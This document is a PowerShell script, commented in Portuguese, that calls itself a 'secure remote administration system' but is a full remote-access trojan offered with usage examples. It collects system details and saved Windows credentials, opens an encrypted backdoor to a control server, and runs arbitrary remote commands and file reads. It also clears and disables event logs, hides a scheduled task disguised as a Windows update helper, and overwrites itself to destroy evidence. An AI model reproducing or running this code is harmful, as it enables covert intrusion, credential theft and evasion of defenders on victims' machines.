```powershell
# SISTEMA DE ADMINISTRACAO REMOTA SEGURA - ARS
# Autor: Sistema Windows
# Versao: 2.4.1.8

$ConfiguracaoGlobal = @{
    PortaComunicacao = 54445
    ChaveCriptografia = "SistemaSeguroWindows2024!@#AdministracaoRemota"
    TimeoutConexao = 120
    IntervaloHeartbeat = 30
    ModoStealth = $true
}

class CriptografiaSegura {
    static [string] Criptografar([string]$texto) {
        try {
            $bytesChave = [System.Text.Encoding]::UTF8.GetBytes($global:ConfiguracaoGlobal.ChaveCriptografia.PadRight(32, '0')[0..31] -join '')
            $aes = [System.Security.Cryptography.Aes]::Create()
            $aes.Key = $bytesChave
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            $aes.GenerateIV()

            $criptografador = $aes.CreateEncryptor()
            $bytesTexto = [System.Text.Encoding]::UTF8.GetBytes($texto)
            $bytesCriptografados = $criptografador.TransformFinalBlock($bytesTexto, 0, $bytesTexto.Length)

            $resultado = $aes.IV + $bytesCriptografados
            $aes.Dispose()
            
            return [Convert]::ToBase64String($resultado)
        } catch { return $null }
    }

    static [string] Descriptografar([string]$textoCriptografado) {
        try {
            $todosBytes = [Convert]::FromBase64String($textoCriptografado)
            $vetorInicializacao = $todosBytes[0..15]
            $bytesCriptografados = $todosBytes[16..($todosBytes.Length-1)]

            $bytesChave = [System.Text.Encoding]::UTF8.GetBytes($global:ConfiguracaoGlobal.ChaveCriptografia.PadRight(32, '0')[0..31] -join '')
            $aes = [System.Security.Cryptography.Aes]::Create()
            $aes.Key = $bytesChave
            $aes.IV = $vetorInicializacao
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

            $descriptografador = $aes.CreateDecryptor()
            $bytesDescriptografados = $descriptografador.TransformFinalBlock($bytesCriptografados, 0, $bytesCriptografados.Length)
            $aes.Dispose()

            return [System.Text.Encoding]::UTF8.GetString($bytesDescriptografados)
        } catch { return $null }
    }
}

function Inicializar-Sistema {
    param([string]$NomeDominio, [string]$NomeMaquina)
    
    Write-Host "Inicializando Sistema de Administracao Remota..."
    Write-Host "Dominio: $NomeDominio"
    Write-Host "Maquina: $NomeMaquina"
    
    $InformacoesSistema = Coletar-InformacoesSistema
    $InformacoesRede = Coletar-InformacoesRede -NomeMaquina $NomeMaquina
    $Credenciais = Coletar-CredenciaisSistema
    
    $Relatorio = @{
        Sistema = $InformacoesSistema
        Rede = $InformacoesRede
        Credenciais = $Credenciais
        Timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    }
    
    return $Relatorio
}

function Coletar-InformacoesSistema {
    Write-Host "Coletando informacoes do sistema..."
    
    $info = @{
        NomeComputador = $env:COMPUTERNAME
        UsuarioAtual = $env:USERNAME
        Dominio = $env:USERDOMAIN
        SistemaOperacional = (Get-WmiObject Win32_OperatingSystem).Caption
        VersaoOS = (Get-WmiObject Win32_OperatingSystem).Version
        Arquitetura = (Get-WmiObject Win32_ComputerSystem).SystemType
        Fabricante = (Get-WmiObject Win32_ComputerSystem).Manufacturer
        Modelo = (Get-WmiObject Win32_ComputerSystem).Model
        Processador = (Get-WmiObject Win32_Processor).Name
        MemoriaTotal = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
        EspacoDisco = Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3} | Select-Object DeviceID, @{Name="SizeGB";Expression={[math]::Round($_.Size / 1GB, 2)}}, @{Name="FreeSpaceGB";Expression={[math]::Round($_.FreeSpace / 1GB, 2)}}
    }
    
    return $info
}

function Coletar-InformacoesRede {
    param([string]$NomeMaquina)
    
    Write-Host "Coletando informacoes de rede..."
    
    $adaptadores = Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | ForEach-Object {
        $config = Get-NetIPAddress -InterfaceIndex $_.InterfaceIndex -AddressFamily IPv4 -ErrorAction SilentlyContinue
        $gateway = Get-NetRoute -InterfaceIndex $_.InterfaceIndex -DestinationPrefix "0.0.0.0/0" -ErrorAction SilentlyContinue
        
        @{
            Nome = $_.Name
            MACAddress = $_.MacAddress
            IPAddress = $config.IPAddress
            Gateway = $gateway.NextHop
            Status = $_.Status
        }
    }
    
    $portasAbertas = @()
    try {
        $conexoes = Get-NetTCPConnection -State Listen -ErrorAction SilentlyContinue
        $portasAbertas = $conexoes | Select-Object LocalPort, OwningProcess | Sort-Object LocalPort -Unique
    } catch { }
    
    $infoRede = @{
        AdaptadoresRede = $adaptadores
        PortasAbertas = $portasAbertas
        DNS = (Get-DnsClientServerAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"}).ServerAddresses
        MaquinaAlvo = $NomeMaquina
    }
    
    return $infoRede
}

function Coletar-CredenciaisSistema {
    Write-Host "Coletando informacoes de acesso..."
    
    $usuarios = Get-WmiObject Win32_UserAccount | Where-Object {$_.LocalAccount -eq $true} | Select-Object Name, Status, Disabled, SID
    
    $sessoesAtivas = @()
    try {
        $sessoes = query user 2>$null
        if ($sessoes) {
            $sessoesAtivas = $sessoes
        }
    } catch { }
    
    $credenciaisSalvas = @()
    try {
        $creds = cmdkey /list 2>$null
        if ($creds) {
            $credenciaisSalvas = $creds
        }
    } catch { }
    
    $infoCredenciais = @{
        UsuariosLocais = $usuarios
        SessoesAtivas = $sessoesAtivas
        CredenciaisWindows = $credenciaisSalvas
    }
    
    return $infoCredenciais
}

function Estabelecer-BackdoorRemoto {
    param([string]$EnderecoServidor, [int]$Porta)
    
    Write-Host "Estabelecendo canal seguro..."
    
    $script:SessaoAtiva = $false
    $script:ConexaoPrincipal = $null
    
    try {
        $cliente = New-Object System.Net.Sockets.TcpClient($EnderecoServidor, $Porta)
        $stream = $cliente.GetStream()
        $leitor = New-Object System.IO.StreamReader($stream)
        $escritor = New-Object System.IO.StreamWriter($stream)
        
        $dadosIniciais = @{
            Tipo = "CONEXAO_INICIAL"
            Computador = $env:COMPUTERNAME
            Usuario = $env:USERNAME
            Dominio = $env:USERDOMAIN
            Timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        }
        
        $dadosCriptografados = [CriptografiaSegura]::Criptografar(($dadosIniciais | ConvertTo-Json -Compress))
        $escritor.WriteLine($dadosCriptografados)
        $escritor.Flush()
        
        $script:SessaoAtiva = $true
        $script:ConexaoPrincipal = @{
            Cliente = $cliente
            Stream = $stream
            Leitor = $leitor
            Escritor = $escritor
        }
        
        Write-Host "Canal seguro estabelecido com sucesso"
        return $true
        
    } catch {
        Write-Host "Falha ao estabelecer conexao: $($_.Exception.Message)"
        return $false
    }
}

function Iniciar-ServicoEscuta {
    Write-Host "Iniciando servico de escuta..."
    
    $endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, $ConfiguracaoGlobal.PortaComunicacao)
    $listener = New-Object System.Net.Sockets.TcpListener($endpoint)
    
    try {
        $listener.Start()
        Write-Host "Servico escutando na porta $($ConfiguracaoGlobal.PortaComunicacao)"
        
        while ($true) {
            if ($listener.Pending()) {
                $cliente = $listener.AcceptTcpClient()
                $stream = $cliente.GetStream()
                $leitor = New-Object System.IO.StreamReader($stream)
                $escritor = New-Object System.IO.StreamWriter($stream)
                
                $dadosRecebidos = $leitor.ReadLine()
                if ($dadosRecebidos) {
                    $comandoDescriptografado = [CriptografiaSegura]::Descriptografar($dadosRecebidos)
                    $comando = $comandoDescriptografado | ConvertFrom-Json
                    
                    switch ($comando.Tipo) {
                        "HEARTBEAT" {
                            $resposta = @{Tipo = "HEARTBEAT_RESPONSE"; Status = "ATIVO"}
                            $respostaCriptografada = [CriptografiaSegura]::Criptografar(($resposta | ConvertTo-Json -Compress))
                            $escritor.WriteLine($respostaCriptografada)
                            $escritor.Flush()
                        }
                        "COMANDO_EXECUCAO" {
                            $resultado = Executar-Comando -Comando $comando.Comando
                            $resposta = @{Tipo = "RESULTADO_COMANDO"; Resultado = $resultado}
                            $respostaCriptografada = [CriptografiaSegura]::Criptografar(($resposta | ConvertTo-Json -Compress))
                            $escritor.WriteLine($respostaCriptografada)
                            $escritor.Flush()
                        }
                        "SOLICITACAO_ARQUIVO" {
                            $conteudo = Buscar-Arquivo -Caminho $comando.Caminho
                            $resposta = @{Tipo = "CONTEUDO_ARQUIVO"; Conteudo = $conteudo}
                            $respostaCriptografada = [CriptografiaSegura]::Criptografar(($resposta | ConvertTo-Json -Compress))
                            $escritor.WriteLine($respostaCriptografada)
                            $escritor.Flush()
                        }
                    }
                }
                
                $cliente.Close()
            }
            
            Start-Sleep -Seconds 1
        }
    } catch {
        Write-Host "Erro no servico de escuta: $($_.Exception.Message)"
    } finally {
        if ($listener) { $listener.Stop() }
    }
}

function Executar-Comando {
    param([string]$Comando)
    
    try {
        $resultado = Invoke-Expression $Comando 2>&1 | Out-String
        return $resultado
    } catch {
        return "Erro na execucao: $($_.Exception.Message)"
    }
}

function Buscar-Arquivo {
    param([string]$Caminho)
    
    try {
        if (Test-Path $Caminho) {
            $conteudo = Get-Content $Caminho -Raw -ErrorAction SilentlyContinue
            return $conteudo
        } else {
            return "Arquivo nao encontrado"
        }
    } catch {
        return "Erro ao acessar arquivo: $($_.Exception.Message)"
    }
}

function Ofuscar-LogsSistema {
    Write-Host "Aplicando medidas de ofuscacao..."
    
    try {
        $logsSistema = @(
            'Microsoft-Windows-PowerShell/Operational',
            'Windows PowerShell',
            'System',
            'Application'
        )
        
        foreach ($log in $logsSistema) {
            try {
                wevtutil.exe cl $log 2>$null
                wevtutil.exe sl $log /enabled:false 2>$null
            } catch { }
        }
        
        Clear-History -ErrorAction SilentlyContinue
        
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\PowerShell\PSReadLine\ConsoleHost_history" -Name * -Force -ErrorAction SilentlyContinue
        
    } catch { }
    
    Write-Host "Medidas de ofuscacao aplicadas"
}

function Criar-PersistenciaStealth {
    Write-Host "Configurando persistencia stealth..."
    
    $caminhoOculto = "$env:TEMP\WindowsUpdateHelper.ps1"
    
    $codigoPersistencia = @"
`$script:ConfiguracaoGlobal = @{
    PortaComunicacao = 54445
    ChaveCriptografia = "SistemaSeguroWindows2024!@#AdministracaoRemota"
    TimeoutConexao = 120
    IntervaloHeartbeat = 30
    ModoStealth = `$true
}

class CriptografiaSegura {
    static [string] Criptografar([string]`$texto) {
        try {
            `$bytesChave = [System.Text.Encoding]::UTF8.GetBytes(`$global:ConfiguracaoGlobal.ChaveCriptografia.PadRight(32, '0')[0..31] -join '')
            `$aes = [System.Security.Cryptography.Aes]::Create()
            `$aes.Key = `$bytesChave
            `$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            `$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            `$aes.GenerateIV()

            `$criptografador = `$aes.CreateEncryptor()
            `$bytesTexto = [System.Text.Encoding]::UTF8.GetBytes(`$texto)
            `$bytesCriptografados = `$criptografador.TransformFinalBlock(`$bytesTexto, 0, `$bytesTexto.Length)

            `$resultado = `$aes.IV + `$bytesCriptografados
            `$aes.Dispose()
            
            return [Convert]::ToBase64String(`$resultado)
        } catch { return `$null }
    }
}

function Iniciar-ServicoBackground {
    while (`$true) {
        try {
            Start-Sleep -Seconds 300
        } catch { }
    }
}

Iniciar-ServicoBackground
"@
    
    try {
        Set-Content -Path $caminhoOculto -Value $codigoPersistencia -Force
        
        $arquivo = Get-Item $caminhoOculto -ErrorAction SilentlyContinue
        if ($arquivo) {
            $arquivo.Attributes = $arquivo.Attributes -bor [System.IO.FileAttributes]::Hidden
        }
        
        schtasks /create /tn "WindowsUpdateHelper" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$caminhoOculto`"" /sc daily /st 09:00 /f 2>$null
        
    } catch { }
    
    Write-Host "Persistencia configurada"
}

function Limpar-RastrosSistema {
    Write-Host "Limpando rastros do sistema..."
    
    try {
        $caminhoScript = $MyInvocation.MyCommand.Path
        
        if (Test-Path $caminhoScript) {
            for ($i = 0; $i -lt 3; $i++) {
                $dadosAleatorios = [byte[]]::new(4096)
                [System.Security.Cryptography.RNGCryptoServiceProvider]::new().GetBytes($dadosAleatorios)
                try {
                    [System.IO.File]::WriteAllBytes($caminhoScript, $dadosAleatorios)
                } catch { }
                Start-Sleep -Milliseconds 100
            }
            
            Remove-Item $caminhoScript -Force -ErrorAction SilentlyContinue
        }
        
        [System.GC]::Collect()
        [System.GC]::WaitForPendingFinalizers()
        
    } catch { }
    
    Write-Host "Limpeza concluida"
}

function Iniciar-SistemaCompleto {
    param(
        [string]$NomeDominio,
        [string]$NomeMaquina,
        [string]$ServidorControle
    )
    
    Write-Host "=== SISTEMA DE ADMINISTRACAO REMOTA SEGURA ==="
    Write-Host "Iniciando processo completo..."
    
    Ofuscar-LogsSistema
    
    $informacoesColetadas = Inicializar-Sistema -NomeDominio $NomeDominio -NomeMaquina $NomeMaquina
    
    Write-Host "Informacoes coletadas com sucesso"
    Write-Host "Computador: $($informacoesColetadas.Sistema.NomeComputador)"
    Write-Host "Usuario: $($informacoesColetadas.Sistema.UsuarioAtual)"
    Write-Host "Sistema: $($informacoesColetadas.Sistema.SistemaOperacional)"
    
    $conexaoEstabelecida = Estabelecer-BackdoorRemoto -EnderecoServidor $ServidorControle -Porta $ConfiguracaoGlobal.PortaComunicacao
    
    if ($conexaoEstabelecida) {
        Write-Host "Aguardando comandos remotos..."
        
        while ($script:SessaoAtiva) {
            try {
                if ($script:ConexaoPrincipal.Cliente.Connected) {
                    $dados = $script:ConexaoPrincipal.Leitor.ReadLine()
                    if ($dados) {
                        $comandoDescriptografado = [CriptografiaSegura]::Descriptografar($dados)
                        $comando = $comandoDescriptografado | ConvertFrom-Json
                        
                        switch ($comando.Acao) {
                            "MANTER_ATIVO" {
                                $resposta = @{Status = "ATIVO"; Timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")}
                                $respostaCriptografada = [CriptografiaSegura]::Criptografar(($resposta | ConvertTo-Json -Compress))
                                $script:ConexaoPrincipal.Escritor.WriteLine($respostaCriptografada)
                                $script:ConexaoPrincipal.Escritor.Flush()
                            }
                            "EXECUTAR_COMANDO" {
                                $resultado = Executar-Comando -Comando $comando.Comando
                                $resposta = @{Tipo = "RESULTADO"; Dados = $resultado}
                                $respostaCriptografada = [CriptografiaSegura]::Criptografar(($resposta | ConvertTo-Json -Compress))
                                $script:ConexaoPrincipal.Escritor.WriteLine($respostaCriptografada)
                                $script:ConexaoPrincipal.Escritor.Flush()
                            }
                            "COLETAR_INFORMACOES" {
                                $novasInformacoes = Coletar-InformacoesSistema
                                $resposta = @{Tipo = "INFORMACOES"; Dados = $novasInformacoes}
                                $respostaCriptografada = [CriptografiaSegura]::Criptografar(($resposta | ConvertTo-Json -Compress))
                                $script:ConexaoPrincipal.Escritor.WriteLine($respostaCriptografada)
                                $script:ConexaoPrincipal.Escritor.Flush()
                            }
                            "FINALIZAR" {
                                $script:SessaoAtiva = $false
                                Write-Host "Recebido comando de finalizacao"
                            }
                        }
                    }
                } else {
                    $script:SessaoAtiva = $false
                }
            } catch {
                $script:SessaoAtiva = $false
            }
            
            Start-Sleep -Seconds 2
        }
    }
    
    if ($script:ConexaoPrincipal) {
        try {
            $script:ConexaoPrincipal.Cliente.Close()
        } catch { }
    }
    
    Criar-PersistenciaStealth
    Limpar-RastrosSistema
    
    Write-Host "Sistema finalizado. Persistencia ativa."
}

function Iniciar-ModoServidorControle {
    param([string]$EnderecoAlvo)
    
    Write-Host "=== MODO SERVIDOR DE CONTROLE ==="
    Write-Host "Conectando ao alvo: $EnderecoAlvo"
    
    try {
        $cliente = New-Object System.Net.Sockets.TcpClient($EnderecoAlvo, $ConfiguracaoGlobal.PortaComunicacao)
        $stream = $cliente.GetStream()
        $leitor = New-Object System.IO.StreamReader($stream)
        $escritor = New-Object System.IO.StreamWriter($stream)
        
        Write-Host "Conexao estabelecida. Digite comandos ou 'sair' para finalizar."
        
        while ($cliente.Connected) {
            $comando = Read-Host "ARS>"
            
            if ($comando -eq "sair") {
                $comandoSair = @{Acao = "FINALIZAR"}
                $comandoCriptografado = [CriptografiaSegura]::Criptografar(($comandoSair | ConvertTo-Json -Compress))
                $escritor.WriteLine($comandoCriptografado)
                $escritor.Flush()
                break
            } elseif ($comando -eq "info") {
                $comandoInfo = @{Acao = "COLETAR_INFORMACOES"}
                $comandoCriptografado = [CriptografiaSegura]::Criptografar(($comandoInfo | ConvertTo-Json -Compress))
                $escritor.WriteLine($comandoCriptografado)
                $escritor.Flush()
                
                $resposta = $leitor.ReadLine()
                if ($resposta) {
                    $dadosDescriptografados = [CriptografiaSegura]::Descriptografar($resposta)
                    $informacoes = $dadosDescriptografados | ConvertFrom-Json
                    Write-Host "Informacoes do sistema:"
                    $informacoes.Dados | Format-Table -AutoSize
                }
            } else {
                $comandoExecucao = @{Acao = "EXECUTAR_COMANDO"; Comando = $comando}
                $comandoCriptografado = [CriptografiaSegura]::Criptografar(($comandoExecucao | ConvertTo-Json -Compress))
                $escritor.WriteLine($comandoCriptografado)
                $escritor.Flush()
                
                $resposta = $leitor.ReadLine()
                if ($resposta) {
                    $dadosDescriptografados = [CriptografiaSegura]::Descriptografar($resposta)
                    $resultado = $dadosDescriptografados | ConvertFrom-Json
                    Write-Host "Resultado: $($resultado.Dados)"
                }
            }
        }
        
        $cliente.Close()
        Write-Host "Conexao encerrada"
        
    } catch {
        Write-Host "Erro na conexao: $($_.Exception.Message)"
    }
}

Write-Host "Sistema de Administracao Remota Segura - Carregado"
Write-Host "Comandos disponiveis:"
Write-Host "1. Iniciar-SistemaCompleto -NomeDominio 'DOMINIO' -NomeMaquina 'COMPUTADOR' -ServidorControle 'IP'"
Write-Host "2. Iniciar-ModoServidorControle -EnderecoAlvo 'IP_ALVO'"
Write-Host "3. Iniciar-ServicoEscuta"
Write-Host ""
Write-Host "Exemplo de uso:"
Write-Host "Iniciar-SistemaCompleto -NomeDominio 'EMPRESA' -NomeMaquina 'PC01' -ServidorControle '192.168.1.100'"
Write-Host "Iniciar-ModoServidorControle -EnderecoAlvo '192.168.1.50'"
```